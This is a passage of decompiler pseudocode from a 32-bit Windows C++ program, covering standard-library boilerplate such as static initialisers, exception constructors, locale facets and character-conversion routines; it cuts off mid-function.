  return atexit(sub_4B7C3A);
}

//----- (00401420) --------------------------------------------------------
int sub_401420()
{
  return atexit(sub_4B7C44);
}

//----- (0040142C) --------------------------------------------------------
void *sub_40142C()
{
  int *v0; // edx

  v0 = &dword_4F0378;
  dword_4F0764 = (int)&dword_4F0378;
  if ( dword_4F0760 )
  {
    *(_DWORD *)(*(_DWORD *)(*(_DWORD *)dword_4F0760 + 4) + dword_4F0760 + 60) = &dword_4F0378;
    v0 = (int *)dword_4F0764;
  }
  if ( dword_4F0768 )
  {
    *(_DWORD *)(*(_DWORD *)(*(_DWORD *)dword_4F0768 + 4) + dword_4F0768 + 60) = v0;
    v0 = (int *)dword_4F0764;
  }
  if ( dword_4F076C )
    *(_DWORD *)(*(_DWORD *)(*(_DWORD *)dword_4F076C + 4) + dword_4F076C + 60) = v0;
  return &unk_4F0371;
}
// 4F0378: using guessed type int dword_4F0378;
// 4F0760: using guessed type int dword_4F0760;
// 4F0764: using guessed type int dword_4F0764;
// 4F0768: using guessed type int dword_4F0768;
// 4F076C: using guessed type int dword_4F076C;

//----- (00401436) --------------------------------------------------------
int sub_401436()
{
  std::_Init_locks::_Init_locks((std::_Init_locks *)&unk_4F0370);
  return atexit(sub_4B7C4E);
}
// 469A89: using guessed type _DWORD __thiscall std::_Init_locks::_Init_locks(std::_Init_locks *__hidden this);

//----- (0040144C) --------------------------------------------------------
int sub_40144C()
{
  sub_41F640(dword_4F0378, (int)&dword_4F03C8, 0, 1);
  return atexit(sub_4B7C58);
}
// 4F0378: using guessed type int dword_4F0378[5];
// 4F03C8: using guessed type int dword_4F03C8;

//----- (00401525) --------------------------------------------------------
int sub_401525()
{
  sub_41FCA0(dword_4F0428, (int)&dword_4F0478, 0, 1);
  return atexit(sub_4B7C6C);
}
// 4F0428: using guessed type int dword_4F0428[5];
// 4F0478: using guessed type int dword_4F0478;

//----- (00401544) --------------------------------------------------------
int sub_401544()
{
  FILE *v0; // esi

  v0 = __acrt_iob_func(2u);
  sub_421380(dword_4F0478);
  dword_4F0478[0] = (int)&std::filebuf::`vftable';
  sub_41F820((int)dword_4F0478, v0, 0);
  return atexit(sub_4B7C76);
}
// 4BBF48: using guessed type void *std::filebuf::`vftable';
// 4F0478: using guessed type int dword_4F0478[23];

//----- (0040157E) --------------------------------------------------------
void *sub_40157E()
{
  dword_4F0758 = (int)&dword_4F0428;
  *(int *)((char *)&dword_4F0464 + *(_DWORD *)(dword_4F0428 + 4)) = dword_4F0754;
  *(int *)((char *)&dword_4F043C + *(_DWORD *)(dword_4F0428 + 4)) |= 2u;
  return &unk_4F0421;
}
// 4F0428: using guessed type int dword_4F0428;
// 4F043C: using guessed type int dword_4F043C;
// 4F0464: using guessed type int dword_4F0464;
// 4F0754: using guessed type int dword_4F0754;
// 4F0758: using guessed type int dword_4F0758;

//----- (00401588) --------------------------------------------------------
int sub_401588()
{
  std::_Init_locks::_Init_locks((std::_Init_locks *)&unk_4F0420);
  return atexit(sub_4B7C80);
}
// 469A89: using guessed type _DWORD __thiscall std::_Init_locks::_Init_locks(std::_Init_locks *__hidden this);

//----- (0040159E) --------------------------------------------------------
int sub_40159E()
{
  return atexit(sub_4B7C8A);
}

//----- (004015AA) --------------------------------------------------------
int sub_4015AA()
{
  std::_Init_locks::_Init_locks((std::_Init_locks *)&unk_4F0770);
  return atexit(sub_4B7C94);
}
// 469A89: using guessed type _DWORD __thiscall std::_Init_locks::_Init_locks(std::_Init_locks *__hidden this);

//----- (004015C0) --------------------------------------------------------
int sub_4015C0()
{
  return atexit(sub_4B7C9E);
}

//----- (004015CC) --------------------------------------------------------
FILE *sub_4015CC()
{
  FILE *result; // eax

  result = __acrt_iob_func(2u);
  dword_4F0BC0 = (int)result;
  return result;
}
// 4F0BC0: using guessed type int dword_4F0BC0;

//----- (004015DA) --------------------------------------------------------
uintptr_t sub_4015DA()
{
  uintptr_t result; // eax

  result = sub_46FA56();
  dword_4F0C20 = result;
  return result;
}
// 4F0C20: using guessed type int dword_4F0C20;

//----- (004015E5) --------------------------------------------------------
void sub_4015E5()
{
  InitializeSListHead(&ListHead);
}

//----- (00401600) --------------------------------------------------------
void *sub_401600()
{
  return &unk_4F1568;
}

//----- (00401610) --------------------------------------------------------
int __cdecl sub_401610(char *Buffer, size_t BufferCount, char *Format, _locale_t Locale, va_list ArgList)
{
  unsigned __int64 *v5; // eax
  int result; // eax

  v5 = (unsigned __int64 *)sub_401600();
  result = __stdio_common_vsprintf_s(*v5, Buffer, BufferCount, Format, Locale, ArgList);
  if ( result < 0 )
    return -1;
  return result;
}

//----- (00401650) --------------------------------------------------------
int sub_401650(char *a1, size_t a2, char *a3, ...)
{
  va_list va; // [esp+14h] [ebp+14h] BYREF

  va_start(va, a3);
  return sub_401610(a1, a2, a3, 0, va);
}

//----- (00401670) --------------------------------------------------------
int __fastcall sub_401670(void *a1, size_t Size, void *Src, size_t Sizea)
{
  if ( !Sizea )
    return 0;
  if ( !a1 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 22;
  }
  if ( Src && Size >= Sizea )
  {
    memmove(a1, Src, Sizea);
    return 0;
  }
  memset(a1, 0, Size);
  if ( !Src )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 22;
  }
  if ( Size >= Sizea )
    return 22;
  *_errno() = 34;
  _invalid_parameter_noinfo();
  return 34;
}

//----- (00401710) --------------------------------------------------------
char *__thiscall sub_401710(char *this, int a2)
{
  int v4; // [esp+8h] [ebp-18h] BYREF
  char v5; // [esp+Ch] [ebp-14h]

  *(_DWORD *)this = &std::exception::`vftable';
  v4 = a2;
  *(_QWORD *)(this + 4) = 0i64;
  v5 = 1;
  __std_exception_copy(&v4, this + 4);
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';

//----- (00401780) --------------------------------------------------------
char *__thiscall sub_401780(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';

//----- (00401830) --------------------------------------------------------
const char *__thiscall sub_401830(_DWORD *this)
{
  int v1; // ecx
  const char *result; // eax

  v1 = this[1];
  result = "Unknown exception";
  if ( v1 )
    return (const char *)v1;
  return result;
}

//----- (004018A0) --------------------------------------------------------
char *__thiscall sub_4018A0(char *this, int a2)
{
  int v4; // [esp+Ch] [ebp-18h] BYREF
  char *v5; // [esp+10h] [ebp-14h]

  v5 = this;
  v4 = a2;
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  LOBYTE(v5) = 1;
  __std_exception_copy(&v4, this + 4);
  *(_DWORD *)this = &std::runtime_error::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B83B8: using guessed type void *std::runtime_error::`vftable';

//----- (00401930) --------------------------------------------------------
_DWORD *__thiscall sub_401930(_DWORD *this, char a2)
{
  *this = &std::exception::`vftable';
  __std_exception_destroy(this + 1);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 483827: using guessed type _DWORD __cdecl __std_exception_destroy(_DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';

//----- (004019A0) --------------------------------------------------------
int __thiscall sub_4019A0(_DWORD *this)
{
  *this = &std::exception::`vftable';
  return __std_exception_destroy(this + 1);
}
// 483827: using guessed type _DWORD __cdecl __std_exception_destroy(_DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';

//----- (004019F0) --------------------------------------------------------
bool __thiscall sub_4019F0(char *this, int a2)
{
  return __std_type_info_compare(this + 4, a2 + 4) == 0;
}
// 48384F: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);

//----- (00401A40) --------------------------------------------------------
int __thiscall sub_401A40(char *this)
{
  return __std_type_info_name(this + 4, &stru_4F0838);
}
// 48388B: using guessed type _DWORD __cdecl __std_type_info_name(_DWORD, PSLIST_HEADER ListHead);

//----- (00401A90) --------------------------------------------------------
char *__thiscall sub_401A90(char *this)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  *((_DWORD *)this + 1) = "bad cast";
  *(_DWORD *)this = &std::bad_cast::`vftable';
  return this;
}
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8414: using guessed type void *std::bad_cast::`vftable';

//----- (00401AF0) --------------------------------------------------------
int __thiscall sub_401AF0(int this, const char *a2)
{
  char pExceptionObject[12]; // [esp+8h] [ebp-1Ch] BYREF
  int v5; // [esp+14h] [ebp-10h]
  int v6; // [esp+20h] [ebp-4h]

  v5 = this;
  std::_Lockit::_Lockit((std::_Lockit *)this, 0);
  v6 = 0;
  *(_DWORD *)(this + 4) = 0;
  *(_BYTE *)(this + 8) = 0;
  *(_DWORD *)(this + 12) = 0;
  *(_BYTE *)(this + 16) = 0;
  *(_DWORD *)(this + 20) = 0;
  *(_WORD *)(this + 24) = 0;
  *(_DWORD *)(this + 28) = 0;
  *(_WORD *)(this + 32) = 0;
  *(_DWORD *)(this + 36) = 0;
  *(_BYTE *)(this + 40) = 0;
  *(_DWORD *)(this + 44) = 0;
  *(_BYTE *)(this + 48) = 0;
  LOBYTE(v6) = 6;
  if ( !a2 )
  {
    sub_4018A0(pExceptionObject, (int)"bad locale name");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVruntime_error_std__);
  }
  std::_Locinfo::_Locinfo_ctor((struct std::_Locinfo *)this, a2);
  v6 = -1;
  return this;
}
// 469AB6: using guessed type _DWORD __thiscall std::_Lockit::_Lockit(std::_Lockit *__hidden this, _DWORD);
// 469F54: using guessed type void __cdecl std::_Locinfo::_Locinfo_ctor(struct std::_Locinfo *, const char *Locale);

//----- (00401BC0) --------------------------------------------------------
void __thiscall sub_401BC0(int this)
{
  std::_Locinfo::_Locinfo_dtor((struct std::_Locinfo *)this);
  if ( *(_DWORD *)(this + 44) )
    j___free_base(*(void **)(this + 44));
  *(_DWORD *)(this + 44) = 0;
  if ( *(_DWORD *)(this + 36) )
    j___free_base(*(void **)(this + 36));
  *(_DWORD *)(this + 36) = 0;
  if ( *(_DWORD *)(this + 28) )
    j___free_base(*(void **)(this + 28));
  *(_DWORD *)(this + 28) = 0;
  if ( *(_DWORD *)(this + 20) )
    j___free_base(*(void **)(this + 20));
  *(_DWORD *)(this + 20) = 0;
  if ( *(_DWORD *)(this + 12) )
    j___free_base(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  if ( *(_DWORD *)(this + 4) )
    j___free_base(*(void **)(this + 4));
  *(_DWORD *)(this + 4) = 0;
  std::_Lockit::~_Lockit((std::_Lockit *)this);
}
// 469B0E: using guessed type void __thiscall std::_Lockit::~_Lockit(std::_Lockit *__hidden this);
// 469F9F: using guessed type void __cdecl std::_Locinfo::_Locinfo_dtor(struct std::_Locinfo *);

//----- (00401CC0) --------------------------------------------------------
char *__thiscall sub_401CC0(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &std::runtime_error::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B83B8: using guessed type void *std::runtime_error::`vftable';

//----- (00401D40) --------------------------------------------------------
void __thiscall sub_401D40(_DWORD *this)
{
  *this = &std::_Facet_base::`vftable';
}
// 4B8420: using guessed type void *std::_Facet_base::`vftable';

//----- (00401D50) --------------------------------------------------------
_DWORD *__thiscall sub_401D50(_DWORD *this, char a2)
{
  *this = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B8420: using guessed type void *std::_Facet_base::`vftable';

//----- (00401D80) --------------------------------------------------------
void __thiscall sub_401D80(volatile signed __int32 *this)
{
  _InterlockedIncrement(this + 1);
}

//----- (00401D90) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_401D90(volatile signed __int32 *this)
{
  volatile signed __int32 *result; // eax

  result = 0;
  if ( !_InterlockedExchangeAdd(this + 1, 0xFFFFFFFF) )
    return this;
  return result;
}

//----- (00401DB0) --------------------------------------------------------
void __thiscall sub_401DB0(_DWORD *this)
{
  *this = &std::locale::facet::`vftable';
  *this = &std::_Facet_base::`vftable';
}
// 4B8420: using guessed type void *std::_Facet_base::`vftable';
// 4B8430: using guessed type void *std::locale::facet::`vftable';

//----- (00401E00) --------------------------------------------------------
void __thiscall sub_401E00(_DWORD *this)
{
  int v1; // ecx
  void (__thiscall ***v2)(_DWORD, int); // eax

  v1 = this[1];
  if ( v1 )
  {
    v2 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v1 + 8))(v1);
    if ( v2 )
      (**v2)(v2, 1);
  }
}

//----- (00401E50) --------------------------------------------------------
_DWORD *__thiscall sub_401E50(_DWORD *this, char a2)
{
  *this = &std::locale::facet::`vftable';
  *this = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B8420: using guessed type void *std::_Facet_base::`vftable';
// 4B8430: using guessed type void *std::locale::facet::`vftable';

//----- (00401EC0) --------------------------------------------------------
wchar_t *__cdecl sub_401EC0(char *a1, int a2, _Cvtvec *a3)
{
  const _Cvtvec *v3; // edx
  const char *v4; // ebx
  unsigned int v5; // ecx
  int v6; // esi
  size_t v7; // edi
  int v8; // eax
  size_t v9; // esi
  wchar_t *result; // eax
  wchar_t *v11; // edi
  int v12; // eax
  size_t v13; // [esp+0h] [ebp-28h]
  wchar_t *v14; // [esp+8h] [ebp-20h]
  mbstate_t v15; // [esp+Ch] [ebp-1Ch] BYREF
  mbstate_t v16; // [esp+14h] [ebp-14h] BYREF
  wchar_t v17; // [esp+1Ch] [ebp-Ch] BYREF

  v3 = a3;
  v4 = a1;
  v16 = 0i64;
  v5 = strlen(a1);
  v6 = 0;
  v13 = v5 + 1;
  v7 = v5 + 1;
  if ( v5 != -1 )
  {
    do
    {
      v8 = _Mbrtowc(&v17, v4, v7, &v16, v3);
      if ( v8 <= 0 )
        break;
      v3 = a3;
      v4 += v8;
      ++v6;
      v7 -= v8;
    }
    while ( v7 );
    v4 = a1;
  }
  v9 = v6 + 1;
  result = (wchar_t *)calloc(v9, 2u);
  v14 = result;
  if ( !result )
    sub_46A166();
  v11 = result;
  v15 = 0i64;
  if ( v9 )
  {
    do
    {
      v12 = _Mbrtowc(v11, v4, v13, &v15, a3);
      if ( v12 <= 0 )
        break;
      v4 += v12;
      ++v11;
      --v9;
    }
    while ( v9 );
    result = v14;
  }
  *v11 = 0;
  return result;
}
// 401EC0: could not find valid save-restore pair for ebx
// 401EC0: could not find valid save-restore pair for edi
// 401EC0: could not find valid save-restore pair for esi
// 46A166: using guessed type void __noreturn sub_46A166(void);

//----- (00401FA0) --------------------------------------------------------
void __thiscall sub_401FA0(_DWORD *this)
{
  *this = &std::codecvt_base::`vftable';
  *this = &std::locale::facet::`vftable';
  *this = &std::_Facet_base::`vftable';
}
// 4B8420: using guessed type void *std::_Facet_base::`vftable';
// 4B8430: using guessed type void *std::locale::facet::`vftable';
// 4BBE24: using guessed type void *std::codecvt_base::`vftable';

//----- (00402000) --------------------------------------------------------
char sub_402000()
{
  return 0;
}

//----- (00402010) --------------------------------------------------------
int sub_402010()
{
  return 1;
}

//----- (00402020) --------------------------------------------------------
_DWORD *__thiscall sub_402020(_DWORD *this, char a2)
{
  *this = &std::codecvt_base::`vftable';
  *this = &std::locale::facet::`vftable';
  *this = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B8420: using guessed type void *std::_Facet_base::`vftable';
// 4B8430: using guessed type void *std::locale::facet::`vftable';
// 4BBE24: using guessed type void *std::codecvt_base::`vftable';

//----- (00402090) --------------------------------------------------------
int __thiscall sub_402090(
        int this,
        int a2,
        const char *a3,
        const char *a4,
        const char **a5,
        wchar_t *a6,
        wchar_t *a7,
        wchar_t **a8)
{
  wchar_t *v8; // ecx
  const char *v9; // edx
  int v10; // eax
  mbstate_t v13; // [esp+4h] [ebp-Ch] BYREF

  v8 = a6;
  *a5 = a3;
  *a8 = a6;
  v9 = *a5;
  v13 = 0i64;
  if ( v9 == a4 )
    return 0;
  while ( v8 != a7 )
  {
    v10 = _Mbrtowc(v8, v9, a4 - v9, &v13, (const _Cvtvec *)(this + 8));
    if ( v10 == -2 )
      break;
    if ( v10 == -1 )
      return 2;
    if ( !v10 )
      v10 = 1;
    *a5 += v10;
    ++*a8;
    v9 = *a5;
    v8 = *a8;
    if ( *a5 == a4 )
      return 0;
  }
  return 1;
}

//----- (00402150) --------------------------------------------------------
int __thiscall sub_402150(
        char *this,
        mbstate_t *a2,
        wchar_t *a3,
        wchar_t *a4,
        wchar_t **a5,
        char *a6,
        char *a7,
        void **a8)
{
  char *v8; // edx
  char *v9; // ebx
  wchar_t *v10; // ecx
  int v11; // eax
  int v12; // ebx
  const _Cvtvec *v14; // [esp-4h] [ebp-2Ch]
  int v15; // [esp+Ch] [ebp-1Ch]
  unsigned int Wchar; // [esp+10h] [ebp-18h]
  char Src[8]; // [esp+1Ch] [ebp-Ch] BYREF

  v8 = a6;
  v9 = this;
  *a5 = a3;
  *a8 = a6;
  v10 = *a5;
  if ( *a5 != a4 )
  {
    while ( v8 != a7 )
    {
      v14 = (const _Cvtvec *)(v9 + 8);
      if ( a7 - v8 < 5 )
      {
        Wchar = a2->_Wchar;
        v15 = *(_DWORD *)&a2->_Byte;
        v12 = _Wcrtomb(Src, *v10, a2, v14);
        if ( v12 < 0 )
          return 2;
        if ( a7 - (_BYTE *)*a8 < v12 )
        {
          a2->_Wchar = Wchar;
          *(_DWORD *)&a2->_Byte = v15;
          v10 = *a5;
          return v10 != a4;
        }
        memmove(*a8, Src, v12);
        ++*a5;
        *a8 = (char *)*a8 + v12;
      }
      else
      {
        v11 = _Wcrtomb(v8, *v10, a2, v14);
        if ( v11 < 0 )
          return 2;
        ++*a5;
        *a8 = (char *)*a8 + v11;
      }
      v10 = *a5;
      v8 = (char *)*a8;
      v9 = this;
      if ( *a5 == a4 )
        return v10 != a4;
    }
  }
  return v10 != a4;
}

//----- (00402260) --------------------------------------------------------
int __thiscall sub_402260(int this, mbstate_t *a2, void *a3, int a4, void **a5)
{
  int v5; // eax
  signed int v7; // esi
  int v8; // [esp+Ch] [ebp-14h]
  unsigned int Wchar; // [esp+10h] [ebp-10h]
  char Src[8]; // [esp+14h] [ebp-Ch] BYREF

  *a5 = a3;
  Wchar = a2->_Wchar;
  v8 = *(_DWORD *)&a2->_Byte;
  v5 = _Wcrtomb(Src, 0, a2, (const _Cvtvec *)(this + 8));
  if ( v5 <= 0 )
    return 2;
  v7 = v5 - 1;
  if ( a4 - (int)*a5 >= v5 - 1 )
  {
    if ( v7 > 0 )
    {
      memmove(*a5, Src, v7);
      *a5 = (char *)*a5 + v7;
    }
    return 0;
  }
  else
  {
    a2->_Wchar = Wchar;
    *(_DWORD *)&a2->_Byte = v8;
    return 1;
  }
}

//----- (00402320) --------------------------------------------------------
int __thiscall sub_402320(char *this, int a2, char *a3, char *a4, unsigned int a5)
{
  unsigned int v5; // edx
  char *v6; // eax
  unsigned int v8; // edi
  int v9; // eax
  bool v10; // cf
  int result; // eax
  unsigned int v13; // [esp+8h] [ebp-14h]
  mbstate_t v14; // [esp+Ch] [ebp-10h] BYREF
  wchar_t v15; // [esp+14h] [ebp-8h] BYREF

  v5 = 0;
  v6 = this;
  v13 = 0;
  v14 = 0i64;
  if ( a5 )
  {
    v8 = 0;
    do
    {
      v5 = v8;
      if ( a3 == a4 )
        break;
      v9 = _Mbrtowc(&v15, a3, a4 - a3, &v14, (const _Cvtvec *)(v6 + 8));
      v5 = v8;
      if ( v9 < 0 )
        break;
      if ( !v9 )
        v9 = 1;
      a3 += v9;
      v10 = v13 + 1 < a5;
      v5 = v13 + 1;
      v13 = v5;
      v8 = v5;
      v6 = this;
    }
    while ( v10 );
  }
  result = 0x7FFFFFFF;
  if ( v5 < 0x7FFFFFFF )
    return v5;
  return result;
}

//----- (004023D0) --------------------------------------------------------
int __cdecl UserMathErrorFunction()
{
  return 0;
}

//----- (004023E0) --------------------------------------------------------
_DWORD *__thiscall sub_4023E0(_DWORD *this, char a2)
{
  *this = &std::codecvt<wchar_t,char,_Mbstatet>::`vftable';
  *this = &std::codecvt_base::`vftable';
  *this = &std::locale::facet::`vftable';
  *this = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B8420: using guessed type void *std::_Facet_base::`vftable';
// 4B8430: using guessed type void *std::locale::facet::`vftable';
// 4BBE24: using guessed type void *std::codecvt_base::`vftable';
// 4BD550: using guessed type void *std::codecvt<wchar_t,char,_Mbstatet>::`vftable';

//----- (00402460) --------------------------------------------------------
void __thiscall sub_402460(_DWORD *this)
{
  *this = &std::ctype_base::`vftable';
  *this = &std::locale::facet::`vftable';
  *this = &std::_Facet_base::`vftable';
}
// 4B8420: using guessed type void *std::_Facet_base::`vftable';
// 4B8430: using guessed type void *std::locale::facet::`vftable';
// 4B8440: using guessed type void *std::ctype_base::`vftable';

//----- (004024C0) --------------------------------------------------------
_DWORD *__thiscall sub_4024C0(_DWORD *this, char a2)
{
  *this = &std::ctype_base::`vftable';
  *this = &std::locale::facet::`vftable';
  *this = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B8420: using guessed type void *std::_Facet_base::`vftable';
// 4B8430: using guessed type void *std::locale::facet::`vftable';
// 4B8440: using guessed type void *std::ctype_base::`vftable';

//----- (00402530) --------------------------------------------------------
int __thiscall sub_402530(int this, unsigned __int8 a2)
{
  return _Tolower(a2, (const _Ctypevec *)(this + 8));
}

//----- (00402550) --------------------------------------------------------
_BYTE *__thiscall sub_402550(char *this, _BYTE *a2, unsigned int a3)
{
  _BYTE *v3; // esi
  unsigned int v4; // ebx
  int v5; // edi
  const _Ctypevec *v6; // eax
  const _Ctypevec *v8; // [esp+Ch] [ebp-4h]

  v3 = a2;
  v4 = a3 - (_DWORD)a2;
  v5 = 0;
  if ( (unsigned int)a2 > a3 )
    v4 = 0;
  if ( v4 )
  {
    v6 = (const _Ctypevec *)(this + 8);
    v8 = (const _Ctypevec *)(this + 8);
    do
    {
      *v3 = _Tolower((unsigned __int8)*v3, v6);
      ++v5;
      v6 = v8;
      ++v3;
    }
    while ( v5 != v4 );
  }
  return v3;
}

//----- (004025A0) --------------------------------------------------------
int __thiscall sub_4025A0(int this, unsigned __int8 a2)
{
  return _Toupper(a2, (const _Ctypevec *)(this + 8));
}

//----- (004025C0) --------------------------------------------------------
_BYTE *__thiscall sub_4025C0(char *this, _BYTE *a2, unsigned int a3)
{
  _BYTE *v3; // esi
  unsigned int v4; // ebx
  int v5; // edi
  const _Ctypevec *v6; // eax
  const _Ctypevec *v8; // [esp+Ch] [ebp-4h]

  v3 = a2;
  v4 = a3 - (_DWORD)a2;
  v5 = 0;
  if ( (unsigned int)a2 > a3 )
    v4 = 0;
  if ( v4 )
  {
    v6 = (const _Ctypevec *)(this + 8);
    v8 = (const _Ctypevec *)(this + 8);
    do
    {
      *v3 = _Toupper((unsigned __int8)*v3, v6);
      ++v5;
      v6 = v8;
      ++v3;
    }
    while ( v5 != v4 );
  }
  return v3;
}

//----- (00402620) --------------------------------------------------------
int __stdcall sub_402620(void *Src, int a2, void *a3)
{
  memmove(a3, Src, a2 - (_DWORD)Src);
  return a2;
}

//----- (00402660) --------------------------------------------------------
int __stdcall sub_402660(void *Src, int a2, int a3, void *a4)
{
  memmove(a4, Src, a2 - (_DWORD)Src);
  return a2;
}

//----- (00402690) --------------------------------------------------------
void *__thiscall sub_402690(void *this, char a2)
{
  int v3; // eax

  *(_DWORD *)this = &std::ctype<char>::`vftable';
  v3 = *((_DWORD *)this + 4);
  if ( v3 <= 0 )
  {
    if ( v3 < 0 )
      j_j_j___free_base(*((void **)this + 3));
  }
  else
  {
    j___free_base(*((void **)this + 3));
  }
  j___free_base(*((void **)this + 5));
  *(_DWORD *)this = &std::ctype_base::`vftable';
  *(_DWORD *)this = &std::locale::facet::`vftable';
  *(_DWORD *)this = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B8420: using guessed type void *std::_Facet_base::`vftable';
// 4B8430: using guessed type void *std::locale::facet::`vftable';
// 4B8440: using guessed type void *std::ctype_base::`vftable';
// 4B8450: using guessed type void *std::ctype<char>::`vftable';

//----- (00402740) --------------------------------------------------------
bool __thiscall sub_402740(int this, unsigned __int16 a2, wchar_t a3)
{
  return ((unsigned __int16)_Getwctype(a3, (const _Ctypevec *)(this + 8)) & a2) != 0;
}

//----- (00402760) --------------------------------------------------------
const wchar_t *__thiscall sub_402760(int this, wchar_t *a2, wchar_t *a3, __int16 *a4)
{
  return _Getwctypes(a2, a3, a4, (const _Ctypevec *)(this + 8));
}

//----- (00402790) --------------------------------------------------------
unsigned __int16 *__thiscall sub_402790(void *this, int a2, unsigned __int16 *a3, unsigned __int16 *a4)
{
  unsigned __int16 *i; // esi

  for ( i = a3; i != a4; ++i )
  {
    if ( (*(unsigned __int8 (__thiscall **)(void *, int, _DWORD))(*(_DWORD *)this + 16))(this, a2, *i) )
      break;
  }
  return i;
}

//----- (004027D0) --------------------------------------------------------
unsigned __int16 *__thiscall sub_4027D0(void *this, int a2, unsigned __int16 *a3, unsigned __int16 *a4)
{
  unsigned __int16 *i; // esi

  for ( i = a3; i != a4; ++i )
  {
    if ( !(*(unsigned __int8 (__thiscall **)(void *, int, _DWORD))(*(_DWORD *)this + 16))(this, a2, *i) )
      break;
  }
  return i;
}

//----- (00402810) --------------------------------------------------------
wchar_t __thiscall sub_402810(int this, wchar_t a2)
{
  return _Towlower(a2, (const _Ctypevec *)(this + 8));
}

//----- (00402830) --------------------------------------------------------
wchar_t *__thiscall sub_402830(char *this, wchar_t *a2, unsigned int a3)
{
  wchar_t *v3; // esi
  unsigned int v4; // ebx
  int v5; // edi
  const _Ctypevec *v6; // eax
  const _Ctypevec *v8; // [esp+Ch] [ebp-4h]

  v3 = a2;
  v4 = (a3 - (unsigned int)a2 + 1) >> 1;
  v5 = 0;
  if ( (unsigned int)a2 > a3 )
    v4 = 0;
  if ( v4 )
  {
    v6 = (const _Ctypevec *)(this + 8);
    v8 = (const _Ctypevec *)(this + 8);
    do
    {
      *v3 = _Towlower(*v3, v6);
      ++v5;
      v6 = v8;
      ++v3;
    }
    while ( v5 != v4 );
  }
  return v3;
}

//----- (00402880) --------------------------------------------------------
wchar_t __thiscall sub_402880(int this, wchar_t a2)
{
  return _Towupper(a2, (const _Ctypevec *)(this + 8));
}

//----- (004028A0) --------------------------------------------------------
wchar_t *__thiscall sub_4028A0(char *this, wchar_t *a2, unsigned int a3)
{
  wchar_t *v3; // esi
  unsigned int v4; // ebx
  int v5; // edi
  const _Ctypevec *v6; // eax
  const _Ctypevec *v8; // [esp+Ch] [ebp-4h]

  v3 = a2;
  v4 = (a3 - (unsigned int)a2 + 1) >> 1;
  v5 = 0;
  if ( (unsigned int)a2 > a3 )
    v4 = 0;
  if ( v4 )
  {
    v6 = (const _Ctypevec *)(this + 8);
    v8 = (const _Ctypevec *)(this + 8);
    do
    {
      *v3 = _Towupper(*v3, v6);
      ++v5;
      v6 = v8;
      ++v3;
    }
    while ( v5 != v4 );
  }
  return v3;
}

//----- (004028F0) --------------------------------------------------------
__int16 __thiscall sub_4028F0(int this, char a2)
{
  int v2; // eax
  wchar_t v3; // cx
  mbstate_t v5; // [esp+0h] [ebp-14h] BYREF
  wchar_t v6; // [esp+8h] [ebp-Ch] BYREF
  char v7[4]; // [esp+Ch] [ebp-8h] BYREF

  v7[0] = a2;
  v5 = 0i64;
  v2 = _Mbrtowc(&v6, v7, 1u, &v5, (const _Cvtvec *)(this + 24));
  v3 = v6;
  if ( v2 < 0 )
    return -1;
  return v3;
}
// 4028F0: using guessed type char var_8[4];

//----- (00402950) --------------------------------------------------------
char *__thiscall sub_402950(char *this, char *a2, unsigned int a3, int a4)
{
  char *v5; // esi
  unsigned int v6; // edi
  const _Cvtvec *v7; // ecx
  int v8; // eax
  wchar_t v9; // cx
  const _Cvtvec *v11; // [esp+Ch] [ebp-1Ch]
  int v12; // [esp+10h] [ebp-18h]
  mbstate_t v13; // [esp+14h] [ebp-14h] BYREF
  wchar_t v14; // [esp+1Ch] [ebp-Ch] BYREF
  char v15[4]; // [esp+20h] [ebp-8h] BYREF

  v5 = a2;
  v6 = a3 - (_DWORD)a2;
  v12 = 0;
  if ( (unsigned int)a2 > a3 )
    v6 = 0;
  if ( v6 )
  {
    v7 = (const _Cvtvec *)(this + 24);
    v11 = v7;
    do
    {
      v15[0] = *v5;
      v13 = 0i64;
      v8 = _Mbrtowc(&v14, v15, 1u, &v13, v7);
      v9 = v14;
      a4 += 2;
      if ( v8 < 0 )
        v9 = -1;
      *(_WORD *)(a4 - 2) = v9;
      v7 = v11;
      ++v5;
      ++v12;
    }
    while ( v12 != v6 );
  }
  return v5;
}
// 402950: using guessed type char var_8[4];

//----- (004029F0) --------------------------------------------------------
char __thiscall sub_4029F0(int this, wchar_t a2, char a3)
{
  int v3; // eax
